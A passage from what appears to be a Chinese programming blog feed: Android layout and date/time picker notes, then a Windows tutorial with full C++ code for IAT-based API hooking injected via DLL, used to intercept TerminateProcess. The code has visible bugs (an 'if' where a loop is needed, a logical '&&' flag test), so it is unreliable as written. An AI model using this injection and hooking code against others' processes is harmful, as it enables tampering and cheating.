class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">ImageView</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span>        </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	        /&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">HorizontalScrollView</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到有一个属性：<code>android:scrollbars</code>，这个就是说我们是否需要滚动条，这里说的是我们右边或下面的滚动条，我们可以设置横向或者纵向的，为了好看，一般设置<code>none</code>就好了。<br>而且这两个配合在一块可以实现纵向拖动，横向细节拖动，其实就是<code>ScrollView</code>包含<code>HorizontalScrollView</code>这个罢了，<code>ScrollView</code>这个里面有几个<code>LinearLayout</code>，<code>LinearLayout</code>里面又有几个<code>HorizontalScrollView</code>。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓日期时间控件</title>
    <url>/2020/02/08/%E5%AE%89%E5%8D%93%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E6%8E%A7%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="TimePicker与DatePicker"><a href="#TimePicker与DatePicker" class="headerlink" title="TimePicker与DatePicker"></a>TimePicker与DatePicker</h2><p>这两个东西比较简单，就是显示日期和显示时间的控件，属性啥的没什么太需要注意的。</p>
<h3 id="日期控件"><a href="#日期控件" class="headerlink" title="日期控件"></a>日期控件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">date.init(<span class="number">2020</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="keyword">new</span> OnDateChangedListener() &#123;<span class="comment">//这里设置的是3月，这个月份比较特殊，是从0开始的</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDateChanged</span><span class="params">(DatePicker view, <span class="keyword">int</span> year, <span class="keyword">int</span> monthOfYear, <span class="keyword">int</span> dayOfMonth)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>,year+<span class="string">"/"</span>+monthOfYear +<span class="string">"/"</span>+dayOfMonth , Toast.LENGTH_SHORT).show();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里需要注意的就是，月份是从0开始算的，也就说我们设置的数+1就是显示的月份。</p>
<h3 id="时间控件"><a href="#时间控件" class="headerlink" title="时间控件"></a>时间控件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">time.setIs24HourView(<span class="keyword">true</span>);</span><br><span class="line">time.setOnTimeChangedListener(<span class="keyword">new</span> OnTimeChangedListener() &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimeChanged</span><span class="params">(TimePicker view, <span class="keyword">int</span> hourOfDay, <span class="keyword">int</span> minute)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>,hourOfDay+<span class="string">"/"</span>+minute , Toast.LENGTH_SHORT).show();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>时间控件就比较好说了，我们先设置是24小时制的，然后就可以这样正常运行了。</p>
<h2 id="TimePickerDialog与DatePickerDialog"><a href="#TimePickerDialog与DatePickerDialog" class="headerlink" title="TimePickerDialog与DatePickerDialog"></a>TimePickerDialog与DatePickerDialog</h2><p>这两个就是两个对话框，让用户选择日期和时间的，用法基本是一样的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Tpd == <span class="keyword">null</span>)</span><br><span class="line">	Tpd = <span class="keyword">new</span> TimePickerDialog(MainActivity.<span class="keyword">this</span>,MyTime,<span class="number">13</span>,<span class="number">30</span>,<span class="keyword">true</span>);</span><br><span class="line">Tpd.show();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if(Dpd == null)</span></span><br><span class="line"><span class="comment">	Dpd = new DatePickerDialog(MainActivity.this,MyData,2020,7-1,25);</span></span><br><span class="line"><span class="comment">Dpd.show();</span></span><br></pre></td></tr></table></figure>
<p>这个MyTime，Mydate是我们上面申请的。<br>具体代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  OnDateSetListener MyData = <span class="keyword">new</span> OnDateSetListener()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDateSet</span><span class="params">(DatePicker view, <span class="keyword">int</span> year, <span class="keyword">int</span> monthOfYear, <span class="keyword">int</span> dayOfMonth)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, year+<span class="string">"/"</span>+monthOfYear+<span class="string">"/"</span>+dayOfMonth, Toast.LENGTH_SHORT).show();;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> OnTimeSetListener MyTime = <span class="keyword">new</span> OnTimeSetListener()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimeSet</span><span class="params">(TimePicker view, <span class="keyword">int</span> hourOfDay, <span class="keyword">int</span> minute)</span> </span>&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, hourOfDay+<span class="string">"/"</span>+minute, Toast.LENGTH_SHORT).show();;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
<p>我也是刚知道有这个样子的写法，学习了。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>API HOOK钩子</title>
    <url>/2020/02/08/API-HOOK%E9%92%A9%E5%AD%90/</url>
    <content><![CDATA[<h1 id="API钩子"><a href="#API钩子" class="headerlink" title="API钩子"></a>API钩子</h1><p>其实准确的说不是通过<code>SetWindowsHookEx</code>这个函数进行设置钩子，因为这个函数似乎实现不了接管函数的效果，那么该如何才能做到接管其他程序的函数是一个比较关键的一点。</p>
<h2 id="进程保护程序"><a href="#进程保护程序" class="headerlink" title="进程保护程序"></a>进程保护程序</h2><p>这是一个比较典型的例子，就是在程序想要调用<code>TerminateProcess</code>异常结束其他进程的时候，我们将它给干掉，看一下实现效果：<br><img src="img1.gif" alt="进程保护"></p>
<p>但是在我测试的过程中，MFC程序只要被DLL加载之后就会接受消息出错，类似按钮消息之类的一些消息，但易语言是没什么问题的。</p>
<h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>其实结合之前的例子，基本上可以说我们已经可以完成了，我们要HOOK程序的某个API函数并且更改某个程序的内容，那么我们就需要有一块内存区域是在这个程序中，所以我们第一步就是需要将我们写好的DLL注入进去，注入的方法有很多，这里是通过消息处理的方法进行注入的。将我们的DLL注入后我们就读取注入程序的IAT，将我们想要修改的函数指向地址修改为我们的相同堆栈格式的函数替换进去（传参类型和返回值占用字节数不一样的话呢会出错的，这种错一般在写Call自动打怪的时候会常见），但是还有一种情况我们等下说。</p>
<h2 id="CAPIHook类的实现"><a href="#CAPIHook类的实现" class="headerlink" title="CAPIHook类的实现"></a>CAPIHook类的实现</h2><p>首先我们要明确，我们要HOOK的函数可能在用户编写程序的过程中会有不少，特别是那种EX，A，W这些版本的，所以我们需要给用户一个比较好的体验的话呢我们需要构造一个链表的结构，比较简单的就是定义一个静态的头指针，然后我们要钩的时候我们就添加就好了，为什么要这么样，我们之后再说，看下我们头文件的定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __APIHOOK_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __APIHOOK_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CAPIHook</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CAPIHook(LPSTR pszModName,LPSTR pszFuncName,PROC pfnHook,BOOL bExcludeAPIHookMod = TRUE);</span><br><span class="line">	<span class="keyword">virtual</span> ~CAPIHook();<span class="comment">//因为有子类</span></span><br><span class="line">	<span class="function"><span class="keyword">operator</span> <span class="title">PROC</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> m_pfnOrig;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	LPSTR m_pszModName;</span><br><span class="line">	LPSTR m_pszFuncName;</span><br><span class="line">	PROC m_pfnOrig;</span><br><span class="line">	PROC m_pfnHook;</span><br><span class="line">	BOOL m_bExcludeAPIHookMod;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReplaceIATEntryInAllMods</span><span class="params">(LPSTR pszExportMod,PROC pfnCurrent,PROC pfnNew,BOOL bExcludeAPIHookMod)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReplaceIATEntryInOneMod</span><span class="params">(LPSTR pszExportMod,PROC pfnCurrent,PROC pfnNew,HMODULE hModCaller)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面代码用来解决其他模块动态加载DLL的</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="comment">//这两个指针用来将所有的CAPIHook连接器</span></span><br><span class="line">	<span class="keyword">static</span> CAPIHook *sm_pHeader;</span><br><span class="line">	CAPIHook *m_pNext;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="comment">//当一个新的DLL被加载的时候调用</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> WINAPI <span class="title">HookNewlyLoadedModule</span><span class="params">(HMODULE hModule,DWORD dwFlags)</span></span>;</span><br><span class="line">	<span class="comment">//用来追踪当前进程加载新的DLL</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryA</span><span class="params">(PCSTR pszModulePath)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryW</span><span class="params">(PCWSTR pszModulePath)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryExA</span><span class="params">(PCSTR pszModulePath,HANDLE hFile,DWORD dwFlags)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> HMODULE WINAPI <span class="title">LoadLibraryExW</span><span class="params">(PCWSTR pszModulePath,HANDLE hFile,DWORD dwFlags)</span></span>;</span><br><span class="line">	<span class="comment">//如果求情已HOOK的API函数，则返回用户自定义的函数的地址</span></span><br><span class="line">	<span class="function"><span class="keyword">static</span> FARPROC WINAPI <span class="title">GetProcAddress</span><span class="params">(HMODULE hModule,LPCSTR lpProcName)</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="comment">//自动挂钩的函数</span></span><br><span class="line">	<span class="keyword">static</span> CAPIHook sm_LoadLibraryA;</span><br><span class="line">	<span class="keyword">static</span> CAPIHook sm_LoadLibraryW;</span><br><span class="line">	<span class="keyword">static</span> CAPIHook sm_LoadLibraryExA;</span><br><span class="line">	<span class="keyword">static</span> CAPIHook sm_LoadLibraryExW;</span><br><span class="line">	<span class="keyword">static</span> CAPIHook sm_GetProcAddress;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> __APIHOOK_H</span></span><br></pre></td></tr></table></figure>
<ol>
<li>我们构造函数中要传入的是模块名称，函数名称，要替换成的函数的地址，是否要Hook本模块的。</li>
<li>析构函数因为如果有子类的话呢我们就要用到虚函数，否则释放不完全，里面将被替换的函数再替换回去</li>
<li>重载了PROC这个操作符，便于操作，在写DLL的时候有个地方是要用到的</li>
<li>几个私有变量：<ol>
<li>模块名称</li>
<li>函数原地址（用于替换会去）</li>
<li>函数HOOK的地址</li>
<li>是否要包含我们自己的模块</li>
</ol>
</li>
<li>两个静态函数，一个是替换一个模块的一个函数，另一个是替换所有模块的这个函数</li>
<li>一个静态成员，用来加载链表的，一个下一个节点的地址</li>
</ol>
<p>下面就需要注意了，由于某些函数是在运行中动态的加载DLL的，所有有的时候我们就是需要是否要加载DLL了，所以我们不仅要HOOK用户钩住的函数还需要HOOK住动态加载DLL的函数和获取函数地址的函数。各个版本的都需要HOOK住</p>
<ol start="7">
<li><code>HookNewlyLoadedModule</code>这个函数用来将我们新加载的模块的进行重新HOOK一遍。</li>
<li>接下来的几个静态函数是新的替换掉的函数。</li>
<li>下面几个静态变量是用来HOOK上面这几个静态函数的</li>
</ol>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CAPIHook.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"TlHelp32.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ImageHlp.h&gt;//调用那个查询IAT的函数，方便罢了</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ImageHlp"</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//CAPIHook对象链表的头指针</span></span><br><span class="line">CAPIHook* CAPIHook::sm_pHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">CAPIHook::CAPIHook(LPSTR pszModName,LPSTR pszFuncName,PROC pfnHook,BOOL bExcludeAPIHookMod <span class="comment">/* = TRUE */</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//把偶才能这个HOOK信息</span></span><br><span class="line">	m_bExcludeAPIHookMod = bExcludeAPIHookMod;</span><br><span class="line">	m_pszFuncName = pszFuncName;</span><br><span class="line">	m_pszModName = pszModName;</span><br><span class="line">	m_pfnHook = pfnHook;</span><br><span class="line">	m_pfnOrig = GetProcAddress(GetModuleHandle(m_pszModName),m_pszFuncName);</span><br><span class="line">	<span class="comment">//将对象添加到链表</span></span><br><span class="line">	m_pNext = sm_pHeader;</span><br><span class="line">	sm_pHeader = <span class="keyword">this</span>;</span><br><span class="line">	ReplaceIATEntryInAllMods(m_pszModName,m_pfnOrig,m_pfnHook,m_bExcludeAPIHookMod);</span><br><span class="line">&#125;</span><br><span class="line">CAPIHook::~CAPIHook()</span><br><span class="line">&#123;</span><br><span class="line">	ReplaceIATEntryInAllMods(m_pszModName,m_pfnHook,m_pfnOrig,m_bExcludeAPIHookMod);</span><br><span class="line">	CAPIHook *p = sm_pHeader;</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="keyword">this</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sm_pHeader = sm_pHeader-&gt;m_pNext;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (p-&gt;m_pNext == <span class="keyword">this</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				p-&gt;m_pNext = <span class="keyword">this</span>-&gt;m_pNext;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p = p-&gt;m_pNext;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//挂钩这些后期加载的函数</span></span><br><span class="line">CAPIHook CAPIHook::sm_LoadLibraryA(<span class="string">"kernel32.dll"</span>,<span class="string">"LoadLibraryA"</span>,(PROC)CAPIHook::LoadLibraryA,TRUE);</span><br><span class="line">CAPIHook CAPIHook::sm_LoadLibraryW(<span class="string">"kernel32.dll"</span>,<span class="string">"LoadLibraryW"</span>,(PROC)CAPIHook::LoadLibraryW,TRUE);</span><br><span class="line">CAPIHook CAPIHook::sm_LoadLibraryExA(<span class="string">"kernel32.dll"</span>,<span class="string">"LoadLibraryExA"</span>,(PROC)CAPIHook::LoadLibraryExA,TRUE);</span><br><span class="line">CAPIHook CAPIHook::sm_LoadLibraryExW(<span class="string">"kernel32.dll"</span>,<span class="string">"LoadLibraryExW"</span>,(PROC)CAPIHook::LoadLibraryExW,TRUE);</span><br><span class="line">CAPIHook CAPIHook::sm_GetProcAddress(<span class="string">"kernel32.dll"</span>,<span class="string">"GetProcAddress"</span>,(PROC)CAPIHook::GetProcAddress,TRUE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> WINAPI CAPIHook::HookNewlyLoadedModule(HMODULE hModule,DWORD dwFlags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//新的API被加载，挂钩各CAPIHook对象要求的API函数</span></span><br><span class="line">	<span class="keyword">if</span> ((hModule != <span class="literal">NULL</span>) &amp;&amp; ((dwFlags &amp;&amp; LOAD_LIBRARY_AS_DATAFILE) == <span class="number">0</span>))<span class="comment">//映射的方式到内存</span></span><br><span class="line">	&#123;</span><br><span class="line">		CAPIHook *p = sm_pHeader;</span><br><span class="line">		ReplaceIATEntryInOneMod(p-&gt;m_pszModName,p-&gt;m_pfnOrig,p-&gt;m_pfnHook,hModule);</span><br><span class="line">		p = p-&gt;m_pNext;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE WINAPI CAPIHook::LoadLibraryA(PCSTR pszModulePath)</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = ::LoadLibraryA(pszModulePath);</span><br><span class="line">	HookNewlyLoadedModule(hModule,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> (hModule);</span><br><span class="line">&#125;</span><br><span class="line">HMODULE WINAPI CAPIHook::LoadLibraryW(PCWSTR pszModulePath)</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = ::LoadLibraryW(pszModulePath);</span><br><span class="line">	HookNewlyLoadedModule(hModule,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> (hModule);</span><br><span class="line">&#125;</span><br><span class="line">HMODULE WINAPI CAPIHook::LoadLibraryExA(PCSTR pszModulePath,HANDLE hFile,DWORD dwFlags)</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = ::LoadLibraryExA(pszModulePath,hFile,dwFlags);</span><br><span class="line">	HookNewlyLoadedModule(hModule,dwFlags);</span><br><span class="line">	<span class="keyword">return</span> (hModule);</span><br><span class="line">&#125;</span><br><span class="line">HMODULE WINAPI CAPIHook::LoadLibraryExW(PCWSTR pszModulePath,HANDLE hFile,DWORD dwFlags)</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModule = ::LoadLibraryExW(pszModulePath,hFile,dwFlags);</span><br><span class="line">	HookNewlyLoadedModule(hModule,dwFlags);</span><br><span class="line">	<span class="keyword">return</span> (hModule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FARPROC WINAPI CAPIHook::GetProcAddress(HMODULE hModule,LPCSTR lpProcName)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//得到真实的函数地址</span></span><br><span class="line">	FARPROC pfn = ::GetProcAddress(hModule,lpProcName);</span><br><span class="line">	<span class="comment">//检查是否是我们需要的函数</span></span><br><span class="line"></span><br><span class="line">	CAPIHook *p = sm_pHeader;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(p != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;m_pfnOrig == pfn)</span><br><span class="line">		&#123;</span><br><span class="line">			pfn = p-&gt;m_pfnHook;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;m_pNext;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CAPIHook::ReplaceIATEntryInOneMod(LPSTR pszExportMod,PROC pfnCurrent,PROC pfnNew,HMODULE hModCaller)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//获取导入表地址</span></span><br><span class="line">	ULONG ulSize;</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToData(hModCaller,TRUE,IMAGE_DIRECTORY_ENTRY_IMPORT,&amp;ulSize);</span><br><span class="line">	<span class="keyword">if</span> (pImportDesc == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	<span class="keyword">while</span>(pImportDesc-&gt;Name !=<span class="number">0</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		LPSTR pszMod = (LPSTR)((DWORD)hModCaller+pImportDesc-&gt;Name);</span><br><span class="line">		<span class="keyword">if</span>(stricmp(pszExportMod,pszMod) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		pImportDesc++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(pImportDesc-&gt;Name == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//取导入表的地址</span></span><br><span class="line">	PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((DWORD)hModCaller+pImportDesc-&gt;FirstThunk);</span><br><span class="line">	<span class="keyword">while</span>(pThunk-&gt;u1.Function)</span><br><span class="line">	&#123;</span><br><span class="line">		PDWORD lpAddr = (PDWORD)&amp;(pThunk-&gt;u1.Function);</span><br><span class="line">		<span class="keyword">if</span> (*lpAddr == (DWORD)pfnCurrent)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD dwWrite;</span><br><span class="line">			<span class="comment">/*修改页面保护属性*/</span></span><br><span class="line">			DWORD dwOldProect;</span><br><span class="line">			MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">			VirtualQuery(lpAddr,&amp;mbi,<span class="keyword">sizeof</span>(mbi));</span><br><span class="line">			VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),PAGE_READWRITE,&amp;dwOldProect);</span><br><span class="line">			WriteProcessMemory(GetCurrentProcess(),lpAddr,&amp;pfnNew,<span class="keyword">sizeof</span>(DWORD),&amp;dwWrite);</span><br><span class="line">			VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),dwOldProect,<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">		pThunk++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> CAPIHook::ReplaceIATEntryInAllMods(LPSTR pszExportMod,PROC pfnCurrent,PROC pfnNew,BOOL bExcludeAPIHookMod)</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hModThis = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (bExcludeAPIHookMod)</span><br><span class="line">	&#123;</span><br><span class="line">		MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">		<span class="keyword">if</span> (VirtualQuery(ReplaceIATEntryInAllMods,&amp;mbi,<span class="keyword">sizeof</span>(mbi)) != <span class="number">0</span>)</span><br><span class="line">			hModThis = (HMODULE)mbi.AllocationBase;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetCurrentProcessId());</span><br><span class="line"></span><br><span class="line">	MODULEENTRY32 me = &#123;<span class="keyword">sizeof</span>(MODULEENTRY32)&#125;;</span><br><span class="line">	BOOL bOk = Module32First(hSnap,&amp;me);</span><br><span class="line">	<span class="keyword">while</span>(bOk)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(me.hModule != hModThis)</span><br><span class="line">			ReplaceIATEntryInOneMod(pszExportMod,pfnCurrent,pfnNew,me.hModule);</span><br><span class="line">		bOk = Module32Next(hSnap,&amp;me);</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(hSnap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>首先源文件中先将我们我们的头指针设置为NULL</li>
<li>在构造函数的时候我们现将我们的HOOK信息初始化一下，然后用下面将要写的替换所有模块的函数替换，然后将自己设置为链表顶端。</li>
<li>析构函数的时候我们将所有的模块替换回去，然后从链表中将自身删除。</li>
<li>然后初始化我们的挂钩函数</li>
<li><code>HookNewlyLoadedModule</code>这个函数是被下面的加载模块调用的，第二个Flags是在EX版本用到的，当存在<code>LOAD_LIBRARY_AS_DATAFILE</code>这样子的一个标志位的时候说明是内存镜像的方式进行载入的，所以我们需要将其替换一下。</li>
<li>下面几个LoadLibrary(Ex)类型的函数大同小异。</li>
<li><code>GetProcAddress</code>这个函数的时候是检查是否有我们要的函数，如果有的话呢就返回我们设置好的函数地址。</li>
<li>上面这几个默认挂钩的函数是全局的不要忘记加::，否则会进入无限递归。</li>
<li><code>ReplaceIATEntryInOneMod</code>这个函数我们之前写过，之前用的是PE的一个就够进行获取输入表的，我们这里使用<code>ImageDirectoryEntryToData</code>这个函数，这个函数不是很难，第二个标志位是需要注意的，我们要的是IAT，而且这个函数需要导入：<code>#include &lt;ImageHlp.h&gt;</code>，并且加载<code>#pragma comment(lib,&quot;ImageHlp&quot;)</code>这个动态链接库。还需要注意的是我们需要修改内存的保护属性有的时候才能写IAT的内容，变成可读可写的内存块。还需要注意的是DLL大小写是不一样的，所以我们使用<code>stricmp</code>这个不区分大小写。</li>
<li><code>ReplaceIATEntryInAllMods</code>这个就是通过遍历当前进程所有的模块句柄，然后传进去，（进入上一个函数，判断有相同模块名称的然后就继续做）。</li>
</ol>
